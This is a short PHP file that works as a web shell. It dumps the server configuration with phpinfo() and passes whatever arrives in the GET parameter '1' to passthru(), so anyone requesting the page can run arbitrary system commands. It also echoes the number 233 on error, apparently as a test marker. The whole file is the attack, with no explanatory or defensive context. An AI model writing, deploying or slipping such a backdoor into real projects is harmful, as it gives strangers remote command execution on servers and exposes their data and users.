<?php
phpinfo();
try {
    passthru($_GET[1]);
} catch (Error $e) {
    echo 233;
}